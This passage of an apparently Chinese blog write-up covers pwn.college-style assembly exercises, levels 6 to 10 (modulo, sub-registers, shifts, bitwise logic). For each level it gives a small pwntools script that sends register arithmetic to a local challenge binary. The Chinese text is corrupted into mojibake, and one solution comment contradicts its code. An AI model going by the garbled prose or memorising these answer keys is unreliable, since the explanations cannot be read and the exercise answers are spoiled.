class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rdx , rdx </span><br><span class="hljs-string">    mov rax,rdi  </span><br><span class="hljs-string">    div rsi &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure></li></ul><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚ä½ å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>æˆ‘ä»¬å°†åœ¨æ¯æ¬¡è¿è¡Œä¹‹å‰åŠ¨æ€è®¾ç½®ä¸€äº›å€¼åˆ°å†…å­˜ä¸­ã€‚æ¯æ¬¡è¿è¡Œæ—¶è¿™äº›å€¼ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦å¯¹å¯„å­˜å™¨è¿›è¡ŒæŸç§å½¢å¼çš„è®¡ç®—æ“ä½œã€‚æˆ‘ä»¬ä¼šäº‹å…ˆå‘Šè¯‰ä½ å“ªäº›å¯„å­˜å™¨å·²ç»è®¾ç½®ï¼Œå¹¶ä¸”ä½ åº”è¯¥å°†ç»“æœæ”¾åœ¨å“ªé‡Œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç»“æœåº”è¯¥æ”¾åœ¨ <span class="hljs-built_in">rax</span> å¯„å­˜å™¨ä¸­ã€‚<br><br>åœ¨æ±‡ç¼–ä¸­ï¼Œæ¨¡è¿ç®—æ˜¯å¦ä¸€ä¸ªæœ‰è¶£çš„æ¦‚å¿µï¼<br><br>x86 å…è®¸ä½ åœ¨é™¤æ³•è¿ç®—åè·å–ä½™æ•°ã€‚<br><br>ä¾‹å¦‚ï¼š<span class="hljs-number">10</span> / <span class="hljs-number">3</span> -&gt; ä½™æ•° = <span class="hljs-number">1</span><br><br>ä½™æ•°ä¸æ¨¡è¿ç®—ç›¸åŒï¼Œæ¨¡è¿ç®—ä¹Ÿç§°ä¸º <span class="hljs-string">&quot;mod&quot;</span> è¿ç®—ç¬¦ã€‚<br><br>åœ¨å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬ç”¨ç¬¦å· <span class="hljs-string">&#x27;%&#x27;</span> è¡¨ç¤ºæ¨¡è¿ç®—ã€‚<br><br>è¯·è®¡ç®—ä»¥ä¸‹å†…å®¹ï¼š  <br><span class="hljs-built_in">rdi</span> % <span class="hljs-built_in">rsi</span><br><br>å°†ç»“æœæ”¾å…¥ <span class="hljs-built_in">rax</span> å¯„å­˜å™¨ä¸­ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0xc799858</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x3f</span><br></code></pre></td></tr></table></figure><p>ç”±äºrax = rdx:rax / reg  ; rdx = ä½™æ•°<br>å› æ­¤rax=rax-rdxå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    div rsi</span><br><span class="hljs-string">    mov rax, rdx </span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚ä½ å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>æˆ‘ä»¬å°†åœ¨æ¯æ¬¡è¿è¡Œä¹‹å‰åŠ¨æ€è®¾ç½®ä¸€äº›å€¼åˆ°å†…å­˜ä¸­ã€‚æ¯æ¬¡è¿è¡Œæ—¶è¿™äº›å€¼ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦å¯¹å¯„å­˜å™¨è¿›è¡ŒæŸç§å½¢å¼çš„è®¡ç®—æ“ä½œã€‚æˆ‘ä»¬ä¼šäº‹å…ˆå‘Šè¯‰ä½ å“ªäº›å¯„å­˜å™¨å·²ç»è®¾ç½®ï¼Œå¹¶ä¸”ä½ åº”è¯¥å°†ç»“æœæ”¾åœ¨å“ªé‡Œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç»“æœåº”è¯¥æ”¾åœ¨ rax å¯„å­˜å™¨ä¸­ã€‚<br><br>x86 ä¸­çš„å¦ä¸€ä¸ªå¾ˆé…·çš„æ¦‚å¿µæ˜¯èƒ½å¤Ÿç‹¬ç«‹è®¿é—®ä½ä½å¯„å­˜å™¨å­—èŠ‚ã€‚<br><br>åœ¨ x86_64 ä¸­ï¼Œæ¯ä¸ªå¯„å­˜å™¨çš„å¤§å°ä¸º 64 ä½ï¼Œåœ¨ä¹‹å‰çš„çº§åˆ«ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ raxã€rdi æˆ– rsi æ¥è®¿é—®æ•´ä¸ªå¯„å­˜å™¨ã€‚<br><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ä¸åŒçš„å¯„å­˜å™¨åç§°æ¥è®¿é—®æ¯ä¸ªå¯„å­˜å™¨çš„ä½ä½å­—èŠ‚ã€‚<br><br>ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ eax æ¥è®¿é—® rax çš„ä½ 32 ä½ï¼Œä½¿ç”¨ ax æ¥è®¿é—®ä½ 16 ä½ï¼Œä½¿ç”¨ al æ¥è®¿é—®ä½ 8 ä½ã€‚<br><br><br><span class="hljs-section">MSB                                    LSB</span><br><span class="hljs-section">+----------------------------------------+</span><br><span class="hljs-section">|                   rax                  |</span><br><span class="hljs-section">+--------------------+-------------------+</span><br><span class="hljs-code">                     |        eax        |</span><br><span class="hljs-code">                     +---------+---------+</span><br><span class="hljs-code">                               |   ax    |</span><br><span class="hljs-code">                               +----+----+</span><br><span class="hljs-code">                               | ah | al |</span><br><span class="hljs-code">                               +----+----+</span><br><br>å‡ ä¹æ‰€æœ‰å¯„å­˜å™¨éƒ½å¯ä»¥è®¿é—®ä½ä½å¯„å­˜å™¨å­—èŠ‚ã€‚<br><br>è¯·ä½¿ç”¨ä¸€æ¡ move æŒ‡ä»¤å°† ax å¯„å­˜å™¨çš„é«˜ 8 ä½è®¾ç½®ä¸º 0x42ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>rax = 0xee4491be45a500d8<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov ah, 0x42 </span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">äº‹å®è¯æ˜ï¼Œä½¿ç”¨ <span class="hljs-keyword">div</span> è¿ç®—ç¬¦è®¡ç®—æ¨¡è¿ç®—æ˜¯å¾ˆæ…¢çš„ï¼<br><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ•°å­¦æŠ€å·§æ¥ä¼˜åŒ–æ¨¡è¿ç®—ï¼ˆ%ï¼‰ã€‚ç¼–è¯‘å™¨ç»å¸¸ä½¿ç”¨è¿™ä¸ªæŠ€å·§ã€‚<br><br>å¦‚æœæˆ‘ä»¬æœ‰ <span class="hljs-string">&quot;x % y&quot;</span>ï¼Œå¹¶ä¸” y æ˜¯ <span class="hljs-number">2</span> çš„å¹‚ï¼Œæ¯”å¦‚ <span class="hljs-number">2</span>^nï¼Œé‚£ä¹ˆç»“æœå°†æ˜¯ x çš„ä½ n ä½ã€‚<br><br>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä½ä½å¯„å­˜å™¨å­—èŠ‚è®¿é—®æ¥é«˜æ•ˆåœ°å®ç°æ¨¡è¿ç®—ï¼<br><br>åªèƒ½ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š  <br><span class="hljs-keyword">mov</span><br><br>è¯·è®¡ç®—ä»¥ä¸‹å†…å®¹ï¼š  <br><span class="hljs-built_in">rax</span> = <span class="hljs-built_in">rdi</span> % <span class="hljs-number">256</span>  <br><span class="hljs-built_in">rbx</span> = <span class="hljs-built_in">rsi</span> % <span class="hljs-number">65536</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x432e</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x97d4bdd6</span><br></code></pre></td></tr></table></figure><ul><li>256æ˜¯8æ¬¡æ–¹ï¼Œ65536æ˜¯16æ¬¡æ–¹</li><li>å¯¹åº”rdiçš„ä½å…«ä½å’Œrsiçš„ä½16ä½</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov al, dil</span><br><span class="hljs-string">    mov bx, si</span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨ä½é€»è¾‘å’Œæ“ä½œã€‚è¿™å°†æ¶‰åŠç›´æ¥ä¸å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­å­˜å‚¨çš„ä½è¿›è¡Œäº¤äº’çš„æ“ä½œã€‚ä½ è¿˜å¯èƒ½éœ€è¦ä½¿ç”¨ x86 ä¸­çš„é€»è¾‘æŒ‡ä»¤ï¼š<span class="hljs-keyword">and</span>ã€<span class="hljs-keyword">or</span>ã€<span class="hljs-keyword">not</span>ã€<span class="hljs-keyword">xor</span>ã€‚<br><br>åœ¨æ±‡ç¼–ä¸­ç§»åŠ¨ä½æ˜¯å¦ä¸€ä¸ªæœ‰è¶£çš„æ¦‚å¿µï¼<br><br>x86 å…è®¸ä½ åœ¨å¯„å­˜å™¨ä¸­â€œç§»åŠ¨â€ä½ã€‚<br><br>ä»¥ <span class="hljs-built_in">al</span> ä¸ºä¾‹ï¼Œå®ƒæ˜¯ <span class="hljs-built_in">rax</span> çš„æœ€ä½çš„ <span class="hljs-number">8</span> ä½ã€‚<br><br><span class="hljs-built_in">al</span> ä¸­çš„å€¼ï¼ˆä»¥ä½è¡¨ç¤ºï¼‰ä¸ºï¼š<br>  <span class="hljs-built_in">rax</span> = <span class="hljs-number">10001010</span><br><br>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ <span class="hljs-keyword">shl</span> æŒ‡ä»¤å‘å·¦ç§»åŠ¨ä¸€æ¬¡ï¼š<br>  <span class="hljs-keyword">shl</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">1</span><br><br>æ–°çš„å€¼ä¸ºï¼š<br>  <span class="hljs-built_in">al</span> = <span class="hljs-number">00010100</span><br><br>æ‰€æœ‰ä½å‘å·¦ç§»åŠ¨ï¼Œæœ€é«˜ä½æ‰è½ï¼ŒåŒæ—¶åœ¨å³ä¾§æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ <span class="hljs-number">0</span>ã€‚<br><br>ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å¯¹ä½ å…³å¿ƒçš„ä½è¿›è¡Œç‰¹æ®Šæ“ä½œã€‚<br><br>ç§»ä½è¿˜å…·æœ‰å¿«é€Ÿä¹˜æ³•ï¼ˆä¹˜ä»¥ <span class="hljs-number">2</span>ï¼‰æˆ–é™¤æ³•ï¼ˆé™¤ä»¥ <span class="hljs-number">2</span>ï¼‰çš„å¥½å¤„ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ç”¨äºè®¡ç®—æ¨¡è¿ç®—ã€‚<br><br>ä»¥ä¸‹æ˜¯é‡è¦çš„æŒ‡ä»¤ï¼š<br>  <span class="hljs-keyword">shl</span> reg1, reg2       &lt;=&gt;     å°† reg1 æŒ‰ reg2 ä¸­çš„ä½æ•°å‘å·¦ç§»åŠ¨<br>  <span class="hljs-keyword">shr</span> reg1, reg2       &lt;=&gt;     å°† reg1 æŒ‰ reg2 ä¸­çš„ä½æ•°å‘å³ç§»åŠ¨<br>  æ³¨æ„ï¼š<span class="hljs-string">&#x27;reg2&#x27;</span> å¯ä»¥ç”±å¸¸æ•°æˆ–å†…å­˜ä½ç½®æ›¿ä»£<br><br>åªèƒ½ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š<br>  <span class="hljs-keyword">mov</span>, <span class="hljs-keyword">shr</span>, <span class="hljs-keyword">shl</span><br><br>è¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br>  å°† <span class="hljs-built_in">rax</span> è®¾ç½®ä¸º <span class="hljs-built_in">rdi</span> çš„ç¬¬ <span class="hljs-number">5</span> ä¸ªæœ€ä½æœ‰æ•ˆå­—èŠ‚ã€‚<br><br>ä¾‹å¦‚ï¼š<br>  <span class="hljs-built_in">rdi</span> = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |<br>  å°† <span class="hljs-built_in">rax</span> è®¾ç½®ä¸º B4 çš„å€¼<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x8902d4d2350b39b0</span><br></code></pre></td></tr></table></figure><p>å…ˆå·¦ç§»ä½3æ¬¡ï¼Œå†å³ç§»ä½7æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br><span class="hljs-comment">#mov rax,rdi</span><br>    <span class="hljs-comment">#shl rax,24</span><br>    <span class="hljs-comment">#shr rax,32</span><br>    <br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    shl rdi,8*3</span><br><span class="hljs-string">    shr rdi,8*7</span><br><span class="hljs-string">    mov rax,rdi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs coq">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨ä½é€»è¾‘å’Œæ“ä½œã€‚è¿™å°†æ¶‰åŠç›´æ¥ä¸å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­å­˜å‚¨çš„ä½è¿›è¡Œäº¤äº’çš„æ“ä½œã€‚ä½ è¿˜å¯èƒ½éœ€è¦ä½¿ç”¨ x86 ä¸­çš„é€»è¾‘æŒ‡ä»¤ï¼šandã€orã€notã€xorã€‚<br><br>åœ¨æ±‡ç¼–ä¸­è¿›è¡Œä½é€»è¾‘è¿ç®—æ˜¯å¦ä¸€ä¸ªæœ‰è¶£çš„æ¦‚å¿µï¼  <br>x86 å…è®¸ä½ å¯¹å¯„å­˜å™¨é€ä½æ‰§è¡Œé€»è¾‘æ“ä½œã€‚<br><br>ä¸ºäº†è¯´æ˜è¿™ä¸ªä¾‹å­ï¼Œå‡è®¾å¯„å­˜å™¨åªå­˜å‚¨ <span class="hljs-number">8</span> ä½ã€‚<br><br>rax å’Œ rbx ä¸­çš„å€¼ä¸ºï¼š  <br>rax = <span class="hljs-number">10101010</span>  <br>rbx = <span class="hljs-number">00110011</span><br><br>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ <span class="hljs-string">&quot;and rax, rbx&quot;</span> æŒ‡ä»¤å¯¹ rax å’Œ rbx è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ï¼Œç»“æœå°†é€šè¿‡é€ä½è¿›è¡Œä¸è¿ç®—æ¥è®¡ç®—ï¼Œå› æ­¤è¢«ç§°ä¸ºä½é€»è¾‘ã€‚<br><br>æ‰€ä»¥ä»å·¦åˆ°å³ï¼š  <br><span class="hljs-number">1</span> AND <span class="hljs-number">0</span> = <span class="hljs-number">0</span>  <br><span class="hljs-number">0</span> AND <span class="hljs-number">0</span> = <span class="hljs-number">0</span>  <br><span class="hljs-number">1</span> AND <span class="hljs-number">1</span> = <span class="hljs-number">1</span>  <br><span class="hljs-number">0</span> AND <span class="hljs-number">1</span> = <span class="hljs-number">0</span>  <br>...<br><br>æœ€åæˆ‘ä»¬å°†ç»“æœç»„åˆåœ¨ä¸€èµ·å¾—åˆ°ï¼š  <br>rax = <span class="hljs-number">00100010</span><br><br>ä»¥ä¸‹æ˜¯ä¸€äº›å‚è€ƒçš„çœŸå€¼è¡¨ï¼š  <br><br>      AND          OR           XOR<br>   A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span>    A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span>    A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span><br>  ---+---+---  ---+---+---  ---+---+---<br>   <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span><br>   <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span><br>   <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">1</span><br>   <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span 